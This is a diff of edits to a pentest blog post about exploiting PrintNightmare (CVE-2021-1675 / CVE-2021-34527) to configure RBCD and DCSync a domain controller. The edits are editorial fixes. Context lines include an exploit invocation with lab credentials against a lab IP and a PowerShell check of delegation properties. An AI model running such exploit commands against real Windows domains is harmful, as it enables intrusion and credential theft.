@@ -3,7 +3,7 @@ layout: post
 title: "Leveraging PrintNightmare to Abuse RBCD and DCSync the Domain"
 date: 2021-06-30 23:00:00 +0300
 author: snovvcrash
-tags: [internal-pentest, active-directory, print-spooler, printer-bug, cve-2021-1675l, CVE-2021-34527, arbitary-file-write, impacket, rbcd]
+tags: [internal-pentest, active-directory, print-spooler, printer-bug, cve-2021-16751, cve-2021-34527, arbitary-file-write, impacket, rbcd]
 ---
 
 A relatively stealthy way to exploit PrintNightmare (CVE-2021-1675 / CVE-2021-34527) by configuring and abusing RBCD on a domain controller.
@@ -18,7 +18,7 @@ A relatively stealthy way to exploit PrintNightmare (CVE-2021-1675 / CVE-2021-34
 
 ## Prologue
 
-The recent [PrintNightmare](https://github.com/afwu/PrintNightmare) (post CVE-2021-1675, *UPD: a few days later Microsoft assinged it a brand new **CVE-2021-34527***) exploit abuses <strike>in</strike>famous Print Spooler service in order to load and execute arbitary code on a Windows machine.
+The recent [PrintNightmare](https://github.com/afwu/PrintNightmare) exploit (post CVE-2021-1675, *UPD: a few days later Microsoft assinged it a brand new **CVE-2021-34527***) abuses <strike>in</strike>famous Print Spooler service in order to load and execute arbitary code on a Windows machine.
 
 I won't dive into the vulnerability analysis because exploit authors will definitely do it better on the upcoming Black Hat event. As for now a brief description of the attack [can be found on the GitHub](https://github.com/afwu/PrintNightmare#cve-2021-1675-analysis).
 
@@ -176,7 +176,7 @@ $ python CVE-2021-1675.py megacorp.local/lowpriv:'Passw0rd1!'@10.10.10.179 '\\10
 
 [![trigger-the-exploit.png](/assets/images/leveraging-printnightmare-to-abuse-rbcd/trigger-the-exploit.png)](/assets/images/leveraging-printnightmare-to-abuse-rbcd/trigger-the-exploit.png)
 
-In the background it will set the `PrincipalsAllowedToDelegateToAccount` property which can be verified like follows:
+In the background it will set the `PrincipalsAllowedToDelegateToAccount` property containing objects that can delegate to MULTIMASTER. It can be verified like follows:
 
 ```powershell
 PS > Get-ADComputer MULTIMASTER -Properties PrincipalsAllowedToDelegateToAccount
